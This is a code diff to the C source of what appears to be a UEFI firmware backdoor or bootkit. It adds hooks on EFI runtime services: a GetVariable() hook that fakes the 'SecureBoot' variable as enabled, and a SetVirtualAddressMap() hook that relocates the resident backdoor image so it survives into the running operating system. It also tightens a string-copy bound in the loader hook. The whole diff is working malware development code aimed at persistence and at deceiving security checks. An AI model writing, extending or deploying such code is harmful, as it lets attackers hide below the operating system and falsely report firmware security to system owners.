@@ -86,6 +86,7 @@ __declspec(allocate(".conf")) INFECTOR_CONFIG m_InfectorConfig =
 VOID *m_ImageBase = NULL;
 EFI_SYSTEM_TABLE *m_ST = NULL;
 EFI_BOOT_SERVICES *m_BS = NULL;
+EFI_RUNTIME_SERVICES *m_RT = NULL;
 
 // debug messages stuff
 EFI_SIMPLE_TEXT_OUTPUT_PROTOCOL *m_TextOutput = NULL; 
@@ -101,6 +102,13 @@ HYPER_V_INFO m_HvInfo;
 
 // report backdoor status using INFECTOR_STATUS_ADDR and HYPER_V_INFO_ADDR memory regions
 BOOLEAN m_bReportStatus = FALSE;
+
+#if defined(BACKDOOR_RUNTIME_HOOKS)
+
+// use EFI_RUNTIME_SERVICES hooks
+BOOLEAN m_bUseRuntimeHooks = FALSE;
+
+#endif
 //--------------------------------------------------------------------------------------
 void ConsolePrintScreen(char *Message)
 {    
@@ -337,7 +345,7 @@ UINT64 __stdcall new_BlLdrLoadImage(
         // second argument contains module path
         UINT16 *pPath = (UINT16 *)arg_02;    
 
-        while (*(pPath + Size) != 0)
+        while (*(pPath + Size) != 0 && Size < MAX_MODULE_NAME_SIZE - 1)
         {
             // convert module path form UTF-16 to ACSII
             szModulePath[Size] = *(char *)(pPath + Size);
@@ -346,7 +354,7 @@ UINT64 __stdcall new_BlLdrLoadImage(
 
         szModulePath[Size] = '\0';
 
-        DbgMsg(__FILE__, __LINE__, __FUNCTION__"(): \"%s\"\r\n", szModulePath);
+        DbgMsg(__FILE__, __LINE__, __FUNCTION__"(): Path = \"%s\"\r\n", szModulePath);
     }
 
     if (Status == 0)
@@ -544,6 +552,172 @@ EFI_STATUS EFIAPI new_OpenProtocol(
     return old_OpenProtocol(Handle, Protocol, Interface, AgentHandle, ControllerHandle, Attributes);
 }
 //--------------------------------------------------------------------------------------
+#if defined(BACKDOOR_RUNTIME_HOOKS)
+
+#define MAX_VARIABLE_NAME_SIZE 0x100
+
+typedef struct _VARIABLE_DEF
+{
+    char *Name;
+    UINT8 *Data;
+    UINTN Size;
+
+} VARIABLE_DEF,
+*PVARIABLE_DEF;
+
+// list of the fake EFI variables for GetVariable() hook handler
+VARIABLE_DEF m_EmulatedVariables[] =
+{
+    { "SecureBoot",     "\x01",     1 },
+    { NULL,             NULL,       0 },
+};
+
+// original address of hooked functions
+EFI_GET_VARIABLE old_GetVariable = NULL;
+EFI_SET_VIRTUAL_ADDRESS_MAP old_SetVirtualAddressMap = NULL;
+
+EFI_STATUS EFIAPI new_GetVariable(
+    CHAR16 *VariableName,
+    EFI_GUID *VendorGuid,
+    UINT32 *Attributes,
+    UINTN *DataSize,
+    VOID *Data)
+{    
+    int Size = 0;    
+    char szVariableName[MAX_VARIABLE_NAME_SIZE];    
+
+    if (VariableName && DataSize)
+    {        
+        while (*(VariableName + Size) != 0 && Size < MAX_VARIABLE_NAME_SIZE - 1)
+        {
+            // convert variable name form UTF-16 to ACSII
+            szVariableName[Size] = *(char *)(VariableName + Size);
+            Size += 1;
+        }
+
+        szVariableName[Size] = '\0';
+
+        if (Size > 0)
+        {
+            PVARIABLE_DEF Variable = m_EmulatedVariables;            
+
+            while (Variable->Name != NULL)
+            {
+                // check if we need to return fake value for this variable
+                if (std_strcmp(szVariableName, Variable->Name) == 0)
+                {
+                    if (*DataSize >= Variable->Size)
+                    {
+                        if (Data)
+                        {
+                            DbgMsg(
+                                __FILE__, __LINE__, 
+                                __FUNCTION__"(): Returning fake value for \"%s\" EFI variable\r\n", 
+                                szVariableName
+                            );
+
+                            std_memcpy(Data, Variable->Data, Variable->Size);
+                        }
+
+                        *DataSize = Variable->Size;
+                        return EFI_SUCCESS;
+                    }
+                    else
+                    {                        
+                        *DataSize = Variable->Size;                        
+                        return EFI_BUFFER_TOO_SMALL;
+                    }
+                }
+
+                Variable += 1;
+            }
+        }        
+    }
+
+    // call original function
+    return old_GetVariable(VariableName, VendorGuid, Attributes, DataSize, Data);
+}
+
+EFI_STATUS EFIAPI new_SetVirtualAddressMap(
+    UINTN MemoryMapSize,
+    UINTN DescriptorSize,
+    UINT32 DescriptorVersion,
+    EFI_MEMORY_DESCRIPTOR *VirtualMap)
+{
+    UINTN i = 0;
+    EFI_MEMORY_DESCRIPTOR *MapEntry = VirtualMap;        
+
+    /*
+        Copy old function address from the global variable because
+        image relocations might be reparsed in this function.
+    */
+    EFI_SET_VIRTUAL_ADDRESS_MAP Func = old_SetVirtualAddressMap;    
+
+    m_TextOutput = NULL;
+
+    DbgMsg(__FILE__, __LINE__, __FUNCTION__"()\r\n");    
+
+    #define FIXUP_ADDR(_addr_) ((EFI_PHYSICAL_ADDRESS)(_addr_) - Addr + MapEntry->VirtualStart)
+
+    #define CHECK_ADDR(_addr_) ((EFI_PHYSICAL_ADDRESS)(_addr_) >= Addr && \
+                                (EFI_PHYSICAL_ADDRESS)(_addr_) < (EFI_PHYSICAL_ADDRESS)RVATOVA(Addr, Len))
+
+    // enumerate virtual memory mappings
+    for (i = 0; i < MemoryMapSize / DescriptorSize; i += 1)
+    {
+        UINTN Len = MapEntry->NumberOfPages * PAGE_SIZE;
+        EFI_PHYSICAL_ADDRESS Addr = MapEntry->PhysicalStart;
+
+        if (CHECK_ADDR(old_GetVariable))
+        {
+            // calculate new virtual address of GetVariable()
+            old_GetVariable = (EFI_GET_VARIABLE)FIXUP_ADDR(old_GetVariable);
+        }
+
+        if (CHECK_ADDR(old_SetVirtualAddressMap))
+        {
+            // calculate new virtual address of SetVirtualAddressMap()
+            old_SetVirtualAddressMap = (EFI_SET_VIRTUAL_ADDRESS_MAP)FIXUP_ADDR(old_SetVirtualAddressMap);
+        }
+    }
+
+    // enumerate virtual memory mappings
+    for (i = 0; i < MemoryMapSize / DescriptorSize; i += 1)
+    {
+        UINTN Len = MapEntry->NumberOfPages * PAGE_SIZE;
+        EFI_PHYSICAL_ADDRESS Addr = MapEntry->PhysicalStart;
+
+        // check for memory region that contants backdoor image
+        if (CHECK_ADDR(m_ImageBase))
+        {
+            VOID *ImageBaseOld = m_ImageBase;
+
+            // calculate new virtual address of backdoor image
+            VOID *ImageBaseNew = (VOID *)FIXUP_ADDR(ImageBaseOld);
+
+            DbgMsg(
+                __FILE__, __LINE__, 
+                "New address of the resident image is "FPTR"\r\n", ImageBaseNew
+            );
+
+            m_ImageBase = ImageBaseNew;
+
+            // update image relocations acording to the new address
+            LDR_UPDATE_RELOCS(ImageBaseOld, ImageBaseOld, ImageBaseNew);
+
+            break;
+        }
+
+        // go to the next entry
+        MapEntry = (EFI_MEMORY_DESCRIPTOR *)((UINT8 *)MapEntry + DescriptorSize);
+    }
+
+    // call original function
+    return Func(MemoryMapSize, DescriptorSize, DescriptorVersion, VirtualMap);
+}
+
+#endif // BACKDOOR_RUNTIME_HOOKS
+//--------------------------------------------------------------------------------------
 // original address of hooked function
 EFI_EXIT_BOOT_SERVICES old_ExitBootServices = NULL;
 
@@ -593,6 +767,22 @@ EFI_STATUS EFIAPI new_ExitBootServices(
 
     // prevent to call DXE services during runtime phase
     m_TextOutput = NULL;
+
+#if defined(BACKDOOR_RUNTIME_HOOKS)
+
+    if (old_GetVariable)
+    {
+        // remove GetVariable() hook
+        m_RT->GetVariable = old_GetVariable;
+    }
+
+    if (old_SetVirtualAddressMap)
+    {
+        // remove SetVirtualAddressMap() hook
+        m_RT->SetVirtualAddressMap = old_SetVirtualAddressMap;
+    }
+
+#endif
 
     if (m_bReportStatus)
     {
@@ -657,7 +847,7 @@ VOID BackdoorEntryResident(VOID *Image)
 
     // hook EFI_BOOT_SERVICES.ExitBootServices()
     old_ExitBootServices = m_BS->ExitBootServices;
-    m_BS->ExitBootServices = _ExitBootServices;        
+    m_BS->ExitBootServices = _ExitBootServices;     
 
     DbgMsg(
         __FILE__, __LINE__, "OpenProtocol() hook was set, handler = "FPTR"\r\n",
@@ -667,7 +857,32 @@ VOID BackdoorEntryResident(VOID *Image)
     DbgMsg(
         __FILE__, __LINE__, "ExitBootServices() hook was set, handler = "FPTR"\r\n",
         _ExitBootServices
-    );
+    );  
+
+#if defined(BACKDOOR_RUNTIME_HOOKS)
+
+    if (m_bUseRuntimeHooks)
+    {
+        // hook GetVariable() runtime function
+        old_GetVariable = m_RT->GetVariable;
+        m_RT->GetVariable = new_GetVariable;
+
+        // hook SetVirtualAddressMap() runtime function
+        old_SetVirtualAddressMap = m_RT->SetVirtualAddressMap;
+        m_RT->SetVirtualAddressMap = new_SetVirtualAddressMap;
+
+        DbgMsg(
+            __FILE__, __LINE__, "GetVariable() hook was set, handler = "FPTR"\r\n",
+            new_GetVariable
+        );
+
+        DbgMsg(
+            __FILE__, __LINE__, "SetVirtualAddressMap() hook was set, handler = "FPTR"\r\n",
+            new_SetVirtualAddressMap
+        );
+    }
+
+#endif // BACKDOOR_RUNTIME_HOOKS    
 
     m_HvInfo.Status = BACKDOOR_ERR_WINLOAD_IMAGE;
     m_HvInfo.ImageBase = NULL;
@@ -785,6 +1000,12 @@ EFI_STATUS EFIAPI BackdoorEntryInfected(EFI_HANDLE ImageHandle, EFI_SYSTEM_TABLE
 
     m_ImageBase = Base;  
 
+#if defined(BACKDOOR_RUNTIME_HOOKS)
+
+    m_bUseRuntimeHooks = TRUE;
+
+#endif
+    
     // call real entry point
     _ModuleEntryPoint(NULL, SystemTable);
 
@@ -811,8 +1032,9 @@ _ModuleEntryPoint(
     EFI_HANDLE ImageHandle,
     EFI_SYSTEM_TABLE *SystemTable) 
 {    
-    m_ST = SystemTable;
-    m_BS = SystemTable->BootServices;
+    m_ST = SystemTable;    
+    m_BS = SystemTable->BootServices;    
+    m_RT = SystemTable->RuntimeServices;
 
 #if defined(BACKDOOR_DEBUG)
 #if defined(BACKDOOR_DEBUG_SERIAL)
